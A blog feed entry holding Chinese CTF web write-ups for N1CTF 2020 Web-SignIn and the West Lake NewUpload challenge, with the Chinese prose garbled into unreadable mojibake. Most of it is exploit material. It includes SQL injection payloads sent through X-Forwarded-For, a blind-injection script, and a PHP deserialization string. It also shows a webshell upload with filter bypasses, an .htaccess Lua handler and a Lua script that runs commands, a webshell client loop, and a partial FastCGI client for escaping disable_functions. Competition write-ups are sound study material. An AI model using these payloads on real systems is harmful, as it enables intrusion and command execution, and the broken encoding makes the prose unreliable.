    <content type="html"><![CDATA[<p>é¢˜è§£åœ°å€ï¼š<a href="https://github.com/Nu1LCTF/n1ctf-2020">https://github.com/Nu1LCTF/n1ctf-2020</a><br>å›½å†…æ¯”è¾ƒå¥½çš„æ¯”èµ›ï¼Œå°†é¢˜ç›®éƒ½æ”¾å‡ºæ¥äº†ï¼Œæ­£å¥½å¯ä»¥æŠ½æ—¶é—´æŠŠã€Œè¥¿æ¹–è®ºå‰‘ã€çš„é¢˜ç›®å¥½å¥½è¡¥è¡¥ã€‚</p><hr><a id="more"></a><h1 id="Web-SignInï¼ˆSQLç›²æ³¨-æŠ¥é”™æ³¨å…¥-å¸ƒå°”æ³¨å…¥ï¼‰"><a href="#Web-SignInï¼ˆSQLç›²æ³¨-æŠ¥é”™æ³¨å…¥-å¸ƒå°”æ³¨å…¥ï¼‰" class="headerlink" title="Web-SignInï¼ˆSQLç›²æ³¨+æŠ¥é”™æ³¨å…¥+å¸ƒå°”æ³¨å…¥ï¼‰"></a>Web-SignInï¼ˆSQLç›²æ³¨+æŠ¥é”™æ³¨å…¥+å¸ƒå°”æ³¨å…¥ï¼‰</h1><p>æ€è·¯å†ç¨‹å¤§è‡´æ˜¯è¿™æ ·çš„ï¼Œæ¯”èµ›åæ²¡ç¯å¢ƒï¼ˆ</p><ul><li>ç†è§£ååºåˆ—åŒ–æ‰§è¡Œæµç¨‹ã€‚</li><li>ååºåˆ—åŒ–æ‰§è¡Œ toString å‡½æ•°ã€‚ï¼ˆç»•è¿‡ wakeupï¼Œåˆ©ç”¨ destuct çš„ echo å‡½æ•°ï¼‰<ul><li>å®‰è£… php5.5</li><li>æœ¬åœ°ç»•è¿‡</li><li>äº‘ç«¯ç»•è¿‡ï¼ˆæ²¡æœ‰å›æ˜¾ï¼‰</li></ul></li><li>åˆ©ç”¨ stristr å‡½æ•°è°ƒç”¨ toString å‡½æ•°ã€‚<ul><li>æ—¶é—´ç›²æ³¨ï¼ˆæ—¶é—´å‡½æ•°è¢« WAF äº†ï¼‰</li><li>SQLæ³¨å…¥ä¹‹åŸºäºè¿è¡Œé”™è¯¯çš„Booleanæ³¨å…¥<ul><li>è¯­æ³•é”™è¯¯å’Œæ­£å¸¸æ‰§è¡Œ noip</li><li>ç‰¹æ®Šé”™è¯¯ welcomeï¼ˆå«æ•°æ®åº“åæˆ–åé¢çš„å‡½æ•°æŠ¥é”™ï¼‰<ul><li>â€˜+(select updatexml(1,concat(0x7e,(select database()),0x7e),1))+â€™</li><li>â€˜+(select _(1))+â€™<br>MySQL</li><li>exp(~(select * from (select n1ctf_websign())a))</li></ul></li></ul></li></ul></li><li>æ„é€  XFF è¿›è¡Œ SQL æ³¨å…¥ã€‚</li><li>ç¼–å†™ exp è¿›è¡ŒæŠ¥é”™<br>payloadï¼šâ€™+(select (database()&gt;1) and exp(~(select * from (select user())n1ctf_websign)))+â€™<br>åˆ©ç”¨ and çš„ç‰¹æ€§è¿›è¡Œåˆ¤æ–­ã€‚</li><li>æœ€åä» n1key ä¸­è¯»å‡º flagã€‚<ul><li>æ³¨æ„å­—æ®µä¸º key æ—¶éœ€è¦ä½¿ç”¨åˆ«åã€‚ï¼ˆä¸MySQLå­—æ®µå†²çªï¼‰</li></ul></li></ul><p>ååºåˆ—åŒ–ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><br><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;flag&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;check&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:&quot;thrmen&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>æ—¶é—´ç›²æ³¨ SQL è¯­å¥ï¼š<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png"></p><p>è¢« ban çš„å‡½æ•°ï¼š<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png"></p><p>ç”¨åˆ°çš„SQLè¯­å¥:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br># æŸ¥è¯¢æ•°æ®åº“åå­—<br># <span class="hljs-keyword">database</span>()<br><br># æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯<br># <span class="hljs-keyword">SELECT</span> concat(version(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>,@@datadir,<span class="hljs-number">0x3a</span>,@@version_compile_os)<br><br># æŸ¥è¯¢æ–‡ä»¶è¯»å–æƒé™<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,file_priv) <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span><br><br># æŸ¥è¯¢å½“å‰ç”¨æˆ·<br># <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br><br># æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬<br># version()<br><br># æŸ¥è¯¢è¡¨åçš„é•¿åº¦<br>#  (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;n1ctf_websign&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span><br><br># æŸ¥è¯¢è¡¨åï¼ˆä¿®æ”¹åé¢çš„ <span class="hljs-keyword">limit</span>ï¼‰<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">DATABASE</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br># åˆ¤æ–­å­—æ®µåï¼ˆä¿®æ”¹åé¢çš„ <span class="hljs-keyword">limit</span>ï¼‰<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;n1key&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>ã€‚<br><br># æŸ¥è¯¢ ip è¡¨ã€‚ï¼ˆè¾¹æ’å…¥è¾¹æŸ¥è¯¢ï¼Œéœ€è¦ä½¿ç”¨åˆ«åï¼‰<br># <span class="hljs-keyword">SELECT</span> tid <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> ip tid <span class="hljs-keyword">from</span> n1ip <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tt<br><br># æŸ¥è¯¢æŸä¸ªå­—æ®µçš„æ•°æ®ï¼ˆkey ä¸æ•°æ®åº“çš„å…³é”®è¯ç›¸å†²çªï¼Œéœ€è¦ä½¿ç”¨åˆ«åï¼‰<br># <span class="hljs-keyword">select</span> GROUP_CONCAT(id) <span class="hljs-keyword">FROM</span> n1key<br># <span class="hljs-keyword">select</span> group_concat(bb.key) <span class="hljs-keyword">from</span> n1key bb<br># <span class="hljs-keyword">select</span> group_concat(key) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">as</span> a<br># <span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> n1key <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># ä¸ä½¿ç”¨å­—æ®µååº¦å€¼<br># <span class="hljs-keyword">SELECT</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key<br><br># åˆ¤æ–­æ˜¯å¦æœ‰æ•°æ®<br># <span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> key <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br><br># æŸ¥è¯¢æ–‡ä»¶<br># <span class="hljs-keyword">SELECT</span> LOAD_FILE(<span class="hljs-string">&#x27;/flag&#x27;</span><br><br></code></pre></td></tr></table></figure><p>çˆ†ç ´ä½¿ç”¨çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>url = <span class="hljs-string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;s:5:%22check%22;N;&#125;&#x27;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-comment"># ç”Ÿæˆåº“åè¡¨åå­—ç¬¦æ‰€åœ¨çš„å­—ç¬¦åˆ—è¡¨å­—å…¸</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ascii_str</span>():</span><br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):  <span class="hljs-comment"># æ‰€æœ‰å¯æ˜¾ç¤ºå­—ç¬¦</span><br>        str_list.append(chr(i))<br>    <span class="hljs-comment"># print(&#x27;å¯æ˜¾ç¤ºå­—ç¬¦ï¼š%s&#x27;%str_list)</span><br>    <span class="hljs-comment"># # è¿”å›å­—ç¬¦åˆ—è¡¨</span><br>    <span class="hljs-keyword">return</span> str_list<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">sql</span>):</span><br>    payload = <span class="hljs-string">&quot;1&#x27;+(select (&quot;</span> + sql + <span class="hljs-string">&quot;) and exp(~(select * from (select user())n1ctf_websign)))+&#x27;&quot;</span><br>    print(payload)<br>    resp = session.get(<br>        url=url,<br>        headers=&#123;<span class="hljs-string">&quot;x-forwarded-for&quot;</span>: payload&#125;<br>    )<br>    soup = BeautifulSoup(markup=resp.text, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><br>    <span class="hljs-comment"># æå–åˆ¤è¯» True å’Œ False çš„ä¾æ®</span><br>    result = soup.find_all(name=<span class="hljs-string">&#x27;code&#x27;</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(result)</span><br><br>    <span class="hljs-comment"># æ‰§è¡ŒæˆåŠŸè¿”å› True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;n1ctf2020&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># ç”¨äºæµ‹è¯•å‡½æ•°æ˜¯å¦æ­£å¸¸æ‰§è¡Œï¼ˆä½¿ç”¨ while ä¸æ–¹ä¾¿ï¼‰</span><br><span class="hljs-comment"># param = f&quot;substr(database(), 1, 1)=&#x27;n&#x27;&quot;</span><br><span class="hljs-comment"># result = query(param)</span><br><span class="hljs-comment"># print(result)</span><br><br><span class="hljs-comment"># ä¸åŒçš„å­—å…¸</span><br>CHAR_DICTIONARY1 = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHAR_DICTIONARY2 = ascii_str()<br><br><span class="hljs-comment"># find ç”¨äºå­˜å‚¨å·²æ‰¾åˆ°çš„å­—ç¬¦</span><br>find = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># ä½¿ç”¨ ascii ä½œç”¨åˆ¤æ–­ä¾æ®æ›´å¥½ã€‚</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    f = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>, <span class="hljs-number">127</span>):<br>        pos = len(find) + <span class="hljs-number">1</span><br>        s = <span class="hljs-string">&#x27;select table_name from information_schema.tables where table_schema=DATABASE() limit 1,1&#x27;</span><br>        <span class="hljs-comment"># ä½¿ç”¨ ascii ç è¿›è¡Œåˆ¤æ–­ï¼ˆæ›´ä¼˜ï¼‰</span><br>        param = <span class="hljs-string">f&quot;ascii(substr((<span class="hljs-subst">&#123;s&#125;</span>), <span class="hljs-subst">&#123;pos&#125;</span>, 1))=&#x27;<span class="hljs-subst">&#123;c&#125;</span>&#x27;&quot;</span><br>        <span class="hljs-comment"># ä½¿ç”¨ char è¿›è¡Œå­—ç¬¦åˆ¤æ–­ã€‚</span><br>        <span class="hljs-comment"># param = f&quot;substr((&#123;s&#125;), &#123;pos&#125;, 1)=&#x27;&#123;c&#125;&#x27;&quot;</span><br>        result = query(param)<br>        <span class="hljs-keyword">if</span> result:<br>            f = <span class="hljs-literal">True</span><br>            find += chr(c)<br>            print(find)<br>            print(<span class="hljs-string">&#x27;-------------------------&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f:<br>        <span class="hljs-keyword">break</span><br>print(find)<br><br></code></pre></td></tr></table></figure><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li>ä½ çœŸçš„äº†è§£ IP å—ï¼ŒPHP å¦‚ä½•ä¸¥æ ¼è·å–çœŸå®ç”¨æˆ· IPï¼Ÿï¼š<a href="https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip">https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip</a></li><li>Bugku INSERT INTOæ³¨å…¥(æ—¶é—´ç›²æ³¨ï¼‰ï¼š<a href="https://blog.csdn.net/qq_37873738/article/details/85633897">https://blog.csdn.net/qq_37873738/article/details/85633897</a></li></ol><hr><p>åé¢çš„é¢˜ç›®ä»¥åæœ‰æ—¶é—´è¡¥è¡¥ï¼ˆå å‘</p>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020å¹´10æœˆè¥¿æ¹–è®ºå‰‘CTFéƒ¨åˆ†webé¢˜è§£</title>
    <link href="/2020/10/14/2020%E5%B9%B410%E6%9C%8814%E6%97%A5-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <url>/2020/10/14/2020%E5%B9%B410%E6%9C%8814%E6%97%A5-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®è´¨é‡å¾ˆé«˜ã€‚</p><hr><a id="more"></a><h1 id="NewUploadï¼ˆphp-fpmä»»æ„ä»£ç æ‰§è¡Œï¼‰"><a href="#NewUploadï¼ˆphp-fpmä»»æ„ä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="NewUploadï¼ˆphp-fpmä»»æ„ä»£ç æ‰§è¡Œï¼‰"></a>NewUploadï¼ˆphp-fpmä»»æ„ä»£ç æ‰§è¡Œï¼‰</h1><ul><li>ä½¿ç”¨ Burpsuite è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ä¸€å¥è¯ï¼Œæ–‡ä»¶åä½¿ç”¨æ¢è¡Œç»•è¿‡ï¼Œä¸Šä¼ å†…å®¹ %00 æˆªæ–­ç»•è¿‡ï¼Œpost å†…å®¹ä½¿ç”¨ base64 åŠ å¯†ï¼Œä¸ç„¶ä¼šè¢«æ‹¦æˆªã€‚</li><li>æŸ¥çœ‹ phpinfo æ‹¿åˆ°é¢˜ç›®è¾ƒä¸ºæ˜æ˜¾çš„2ä¸ªæ¡ä»¶ï¼š<ol><li>disable_functionï¼Œè¿‡æ»¤äº†å¦‚ä¸‹å‡½æ•°</li><li>open_basediré™åˆ¶äº†å¦‚ä¸‹ç›®å½•</li></ol></li><li>è¯»å–æ ¹ç›®å½• var_dump(scandir(â€œ/â€œ));å‘ç° flag æ–‡ä»¶å’Œ readflag æ–‡ä»¶ã€‚</li><li>open_basedir ç»•è¿‡å°è¯•è¯»å– 2 ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹flagæ–‡ä»¶ï¼ˆæ²¡æœ‰æƒé™ï¼‰ã€readflagæ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚</li><li>ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œæ–¹ä¾¿åé¢è¿›è¡Œåˆ©ç”¨ã€‚</li></ul><p><strong>è§£æ³•1:å®å¡” Apache é»˜è®¤å®‰è£…çš„ lua æ¨¡å—é…åˆ htaccess æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong></p><ul><li>ç¼–å†™å¹¶ä¸Šä¼  .htaccess æ–‡ä»¶</li><li>å†™ä¸€ä¸ª 1.lua è¿›è¡Œå‘½ä»¤æ‰§è¡Œå³å¯æ‹¿åˆ° flag{3be9f1618515e751892cef4cf16f820e}</li></ul><p><strong>.htaccess æ–‡ä»¶</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>lua-<span class="hljs-keyword">script </span>.lua<br></code></pre></td></tr></table></figure><p><strong>1.lua</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span><span class="hljs-params">(r)</span></span><br>    r.content_type = <span class="hljs-string">&quot;text/plain&quot;</span><br>    <span class="hljs-keyword">local</span> t = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>)<br>    <span class="hljs-keyword">local</span> a = t:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*all&quot;</span>)<br>    r:puts(a)<br><br><br>    <span class="hljs-keyword">if</span> r.method == <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>( r:parseargs() ) <span class="hljs-keyword">do</span><br>            r:puts( <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, k, v) )<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">else</span><br>        r:puts(<span class="hljs-string">&quot;Unsupported HTTP method &quot;</span> .. r.method)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><strong>è§£æ³•3ï¼šåˆ©ç”¨tmpä¸‹çš„php-fpm socketåŠ è½½æ‰©å±•ï¼ˆåˆ©ç”¨èšå‰‘æ’ä»¶ï¼‰</strong></p><ul><li>ç¼–è¯‘å¹¶ä¸Šä¼  ant.soã€‚</li><li>ä¸Šä¼ èšå‰‘çš„åŠ è½½æ‹“å±•è„šæœ¬ 2.php</li><li>ä¸Šä¼  s.php æ‰§è¡Œå‡½æ•°</li><li>è®¿é—® s.php å¾—åˆ° flagã€‚ </li></ul><p><strong>æ–¹ä¾¿æ‰§è¡Œä»£ç ï¼ˆè‡ªå·±base64ï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><br>session = requests.Session()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://newupload.xhlj.wetolink.com/sandbox/i631kn4rq3skctfkab4d65uhuc/upload/5.php&quot;</span><br>    resp = session.post(<br>        url=url,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;pass&#x27;</span>: input()<br>        &#125;<br>    )<br>    print(resp.text)<br>    print(<span class="hljs-string">&#x27;------------------------------------&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> VERSION_1            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> BEGIN_REQUEST        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> PARAMS               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> STDIN                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> STDOUT               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> STDERR               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> DATA                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES_RESULT    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> UNKNOWN_TYPE         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> RESPONDER            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">protected</span> $keepAlive = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">protected</span> $_requests = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">protected</span> $_requestCounter = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params">$type, $content, $requestId = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $offset = <span class="hljs-number">0</span>;<br>        $totLen = strlen($content);<br>        $buf    = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">// Packets can be a maximum of 65535 bytes</span><br>            $part = substr($content, 